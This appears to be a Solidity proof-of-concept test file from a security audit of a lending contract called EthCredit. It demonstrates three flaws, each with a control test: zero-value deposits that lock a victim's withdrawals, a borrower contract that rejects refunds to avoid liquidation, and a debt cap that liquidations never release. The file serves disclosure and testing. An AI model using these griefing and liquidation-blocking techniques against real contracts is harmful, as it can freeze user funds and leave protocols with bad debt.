// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Proof} from "proof/Proof.sol";
import {EthCredit, IOracle} from "../src/EthCredit.sol";

contract Oracle is IOracle {
    uint256 public ethUsd = 2_000e18;
    function set(uint256 p) external { ethUsd = p; }
}

// A borrower contract that can stop accepting ETH.
contract Borrower {
    EthCredit credit;
    bool public closed;
    constructor(EthCredit c) { credit = c; }
    function open(uint256 borrowAmt) external payable {
        credit.depositFor{value: msg.value}(address(this));
        credit.borrow(borrowAmt);
    }
    function close() external { closed = true; }
    receive() external payable { require(!closed, "no ETH"); }
}

contract EthCreditProof is Proof {
    Oracle oracle;
    EthCredit credit;
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    address liq = address(0x1100);
    address mallory = address(0x3A11);

    function setUp() public {
        oracle = new Oracle();
        credit = new EthCredit(oracle);
        vm.deal(alice, 100_000 ether);
        vm.deal(bob, 100_000 ether);
        vm.deal(liq, 100_000 ether);
        // The liquidator holds cUSD from a healthy position of its own.
        vm.startPrank(liq);
        credit.depositFor{value: 1_000 ether}(liq);
        credit.borrow(500_000e18);
        vm.stopPrank();
    }

    // Issue 1: anyone can call depositFor(victim) with zero ETH, which stamps the victim's
    // lastDeposit with the current block and makes the victim's withdraw revert.
    function test_issue1_zeroDepositForBlocksWithdraw() public {
        vm.roll(100);
        vm.prank(alice);
        credit.depositFor{value: 10 ether}(alice);
        for (uint256 b = 101; b < 106; b++) {
            vm.roll(b);
            vm.prank(mallory);
            credit.depositFor{value: 0}(alice); // placed ahead of Alice in every block
            vm.prank(alice);
            vm.expectRevert();
            credit.withdraw(10 ether);
        }
        assertEq(credit.eth(alice), 10 ether, "alice's ETH stays locked");
    }

    function test_issue1_control_withdrawWorksUntouched() public {
        vm.roll(100);
        vm.prank(alice);
        credit.depositFor{value: 10 ether}(alice);
        vm.roll(101);
        uint256 before = alice.balance;
        vm.prank(alice);
        credit.withdraw(10 ether);
        assertEq(alice.balance - before, 10 ether, "withdraw works without the zero deposit");
    }

    // Issue 2: liquidation pushes the leftover ETH to the borrower with Address.sendValue,
    // so a borrower contract that rejects ETH makes its own liquidation revert.
    function test_issue2_borrowerRejectsRefundSoCannotBeLiquidated() public {
        Borrower b = new Borrower(credit);
        b.open{value: 100 ether}(100_000e18); // 50% of 200,000 USD
        b.close();
        oracle.set(1_300e18); // LTV 100,000 / 130,000 = 77% > 75%
        vm.prank(liq);
        vm.expectRevert();
        credit.liquidate(address(b));
        assertEq(credit.debt(address(b)), 100_000e18, "bad position stays open");
        oracle.set(900e18); // now under water: 100,000 debt on 90,000 of ETH
        vm.prank(liq);
        vm.expectRevert();
        credit.liquidate(address(b));
        assertEq(credit.debt(address(b)), 100_000e18, "still open, the loss grows");
    }

    function test_issue2_control_plainBorrowerIsLiquidated() public {
        vm.prank(alice);
        credit.depositFor{value: 100 ether}(alice);
        vm.prank(alice);
        credit.borrow(100_000e18);
        oracle.set(1_300e18);
        vm.prank(liq);
        credit.liquidate(alice);
        assertEq(credit.debt(alice), 0, "liquidated");
    }

    // Issue 3: liquidate clears the position's debt but never lowers totalDebt (repay does),
    // so the 10,000,000 cap fills with debt that no longer exists and new borrowing stops.
    function test_issue3_liquidationNeverReleasesCap() public {
        vm.prank(alice);
        credit.depositFor{value: 20_000 ether}(alice);
        vm.prank(alice);
        credit.borrow(9_500_000e18); // cap now full: 500,000 + 9,500,000
        assertEq(credit.totalDebt(), 10_000_000e18, "cap reached");
        oracle.set(600e18); // ETH falls: 9.5M / 12M = 79% > 75%
        vm.prank(alice);
        credit.transfer(liq, 9_500_000e18); // liquidator obtains the cUSD it must burn
        vm.prank(liq);
        credit.liquidate(alice);
        assertEq(credit.debt(alice), 0, "alice's debt is gone");
        assertEq(credit.totalDebt(), 10_000_000e18, "but totalDebt still counts it");
        // Real outstanding debt is only the liquidator's 500,000, yet nobody can borrow.
        vm.prank(bob);
        credit.depositFor{value: 10_000 ether}(bob);
        vm.prank(bob);
        vm.expectRevert();
        credit.borrow(1e18);
    }

    function test_issue3_control_repayReleasesCap() public {
        vm.prank(alice);
        credit.depositFor{value: 20_000 ether}(alice);
        vm.prank(alice);
        credit.borrow(9_500_000e18);
        vm.prank(alice);
        credit.repay(9_500_000e18);
        assertEq(credit.totalDebt(), 500_000e18, "repay lowers totalDebt");
    }
}
